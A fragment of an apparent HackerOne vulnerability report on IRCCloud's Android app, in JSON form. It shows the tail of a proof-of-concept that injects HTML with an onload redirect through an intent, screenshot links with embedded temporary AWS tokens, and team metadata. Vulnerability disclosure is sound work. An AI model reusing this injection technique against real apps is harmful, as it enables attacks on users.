onload=&#39;window.location.href=\\&quot;http://yahoo.com\\&quot;&quot;</span><span class=\"o\">));</span>\n        <span class=\"n\">startActivity</span><span class=\"o\">(</span><span class=\"n\">intent</span><span class=\"o\">);</span>\n</code></pre>\n<p>Result:<br>\n<a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"2017-10-26_15-15-58.jpg\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/233/010/6f259ee38d609477cfc958a9dbd9b2ddbe712b32/2017-10-26_15-15-58.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQVYUZEEBI%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223026Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDMO36pSTeUTC%2FSulZyK3A%2F5%2B%2FTOIgP6UP6H0wSySVBbyL4FQzfP8bav04ajjwBBaxmOhkHA2wujzRb5TbhMhSerMFHQMs%2BlaWPr9zHOl9bbpq8AObWm7%2BuYiH%2BdA7DVleq4N%2BRlVWG6ukszpeguapBWm%2BeaJz0G%2BtsAf0URs%2FZMn4gmiEGoILlZfH0Rxga04TPWKr%2BmJq3DgVJVO8RtbrjLs0%2BhbTb5D6fQvXvZFqnYE5Cq1E4wzEU6Z0Vk16WfzancxdjY7xdYjXkaE4By4xpRprbRaCsQPyDiBmTv0e4fZZUzHn9AjPRxIaswdwrcjaXpaPttjxFnmTigGxFQd%2FIk%2BnLBRveHtHrDZMcPESe9UFT8iakt2ZZLVeHA2xYnKx1ntoUshuUm75iMCEVRsFrVOfDopKYAuhSUTkGAp4XOliz2GytEQUQkeqhliO5VdioSueZvZadU9HHNOh5%2B90tBDDLxOK4Kh1FDQaJDMx84K%2FsBLvwqLH2hzqyXyNTjWFchQyXDNcu04rcBuH9%2BWWM9YV2K9gLNj%2BPuUU2uBat%2FkH9T3MGSQLTZehkqVxj%2BKPShN9%2Bsy39j%2FW%2BarOzYC1kRM0e%2F%2FsEso25Km4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=12ffeaedf688315e40f5cb2b3b2e1c31465a0202ea6b8aa600e81b04a3b913b1\" data-attachment-type=\"image/jpeg\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/233/010/6f259ee38d609477cfc958a9dbd9b2ddbe712b32/2017-10-26_15-15-58.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQVYUZEEBI%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223026Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDMO36pSTeUTC%2FSulZyK3A%2F5%2B%2FTOIgP6UP6H0wSySVBbyL4FQzfP8bav04ajjwBBaxmOhkHA2wujzRb5TbhMhSerMFHQMs%2BlaWPr9zHOl9bbpq8AObWm7%2BuYiH%2BdA7DVleq4N%2BRlVWG6ukszpeguapBWm%2BeaJz0G%2BtsAf0URs%2FZMn4gmiEGoILlZfH0Rxga04TPWKr%2BmJq3DgVJVO8RtbrjLs0%2BhbTb5D6fQvXvZFqnYE5Cq1E4wzEU6Z0Vk16WfzancxdjY7xdYjXkaE4By4xpRprbRaCsQPyDiBmTv0e4fZZUzHn9AjPRxIaswdwrcjaXpaPttjxFnmTigGxFQd%2FIk%2BnLBRveHtHrDZMcPESe9UFT8iakt2ZZLVeHA2xYnKx1ntoUshuUm75iMCEVRsFrVOfDopKYAuhSUTkGAp4XOliz2GytEQUQkeqhliO5VdioSueZvZadU9HHNOh5%2B90tBDDLxOK4Kh1FDQaJDMx84K%2FsBLvwqLH2hzqyXyNTjWFchQyXDNcu04rcBuH9%2BWWM9YV2K9gLNj%2BPuUU2uBat%2FkH9T3MGSQLTZehkqVxj%2BKPShN9%2Bsy39j%2FW%2BarOzYC1kRM0e%2F%2FsEso25Km4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=12ffeaedf688315e40f5cb2b3b2e1c31465a0202ea6b8aa600e81b04a3b913b1\" class=\"markdown-inline-image\"></a><br>\n<a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"2017-10-26_15-15-26.jpg\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/233/011/146432005717c4cb5a03428bd861945404c89327/2017-10-26_15-15-26.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQVYUZEEBI%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223026Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDMO36pSTeUTC%2FSulZyK3A%2F5%2B%2FTOIgP6UP6H0wSySVBbyL4FQzfP8bav04ajjwBBaxmOhkHA2wujzRb5TbhMhSerMFHQMs%2BlaWPr9zHOl9bbpq8AObWm7%2BuYiH%2BdA7DVleq4N%2BRlVWG6ukszpeguapBWm%2BeaJz0G%2BtsAf0URs%2FZMn4gmiEGoILlZfH0Rxga04TPWKr%2BmJq3DgVJVO8RtbrjLs0%2BhbTb5D6fQvXvZFqnYE5Cq1E4wzEU6Z0Vk16WfzancxdjY7xdYjXkaE4By4xpRprbRaCsQPyDiBmTv0e4fZZUzHn9AjPRxIaswdwrcjaXpaPttjxFnmTigGxFQd%2FIk%2BnLBRveHtHrDZMcPESe9UFT8iakt2ZZLVeHA2xYnKx1ntoUshuUm75iMCEVRsFrVOfDopKYAuhSUTkGAp4XOliz2GytEQUQkeqhliO5VdioSueZvZadU9HHNOh5%2B90tBDDLxOK4Kh1FDQaJDMx84K%2FsBLvwqLH2hzqyXyNTjWFchQyXDNcu04rcBuH9%2BWWM9YV2K9gLNj%2BPuUU2uBat%2FkH9T3MGSQLTZehkqVxj%2BKPShN9%2Bsy39j%2FW%2BarOzYC1kRM0e%2F%2FsEso25Km4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=a6008e412b5141cc2e782629c103ea043c9f330a588a0232e1e22e638757f803\" data-attachment-type=\"image/jpeg\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/233/011/146432005717c4cb5a03428bd861945404c89327/2017-10-26_15-15-26.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQVYUZEEBI%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223026Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDMO36pSTeUTC%2FSulZyK3A%2F5%2B%2FTOIgP6UP6H0wSySVBbyL4FQzfP8bav04ajjwBBaxmOhkHA2wujzRb5TbhMhSerMFHQMs%2BlaWPr9zHOl9bbpq8AObWm7%2BuYiH%2BdA7DVleq4N%2BRlVWG6ukszpeguapBWm%2BeaJz0G%2BtsAf0URs%2FZMn4gmiEGoILlZfH0Rxga04TPWKr%2BmJq3DgVJVO8RtbrjLs0%2BhbTb5D6fQvXvZFqnYE5Cq1E4wzEU6Z0Vk16WfzancxdjY7xdYjXkaE4By4xpRprbRaCsQPyDiBmTv0e4fZZUzHn9AjPRxIaswdwrcjaXpaPttjxFnmTigGxFQd%2FIk%2BnLBRveHtHrDZMcPESe9UFT8iakt2ZZLVeHA2xYnKx1ntoUshuUm75iMCEVRsFrVOfDopKYAuhSUTkGAp4XOliz2GytEQUQkeqhliO5VdioSueZvZadU9HHNOh5%2B90tBDDLxOK4Kh1FDQaJDMx84K%2FsBLvwqLH2hzqyXyNTjWFchQyXDNcu04rcBuH9%2BWWM9YV2K9gLNj%2BPuUU2uBat%2FkH9T3MGSQLTZehkqVxj%2BKPShN9%2Bsy39j%2FW%2BarOzYC1kRM0e%2F%2FsEso25Km4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=a6008e412b5141cc2e782629c103ea043c9f330a588a0232e1e22e638757f803\" class=\"markdown-inline-image\"></a></p>\n\n<p>APK is attached</p>\n", 
+    "severity_rating": "medium", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://www.irccloud.com", 
+            "about": "Group chat for teams, friends, and communities. IRCCloud is an IRC client with a future. Stay connected, chat from anywhere, and never miss a message.", 
+            "twitter_handle": "irccloud", 
+            "name": "IRCCloud"
+        }, 
+        "handle": "irccloud", 
+        "url": "https://hackerone.com/irccloud", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/000/140/09194dde3d6edd86ef8ce84ce7f9c277a953e1b7_small.png?1397053347", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/000/140/5cf4f659a47ba7cb2c48a391465795c07e2ae926_medium.png?1397053347"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 140, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
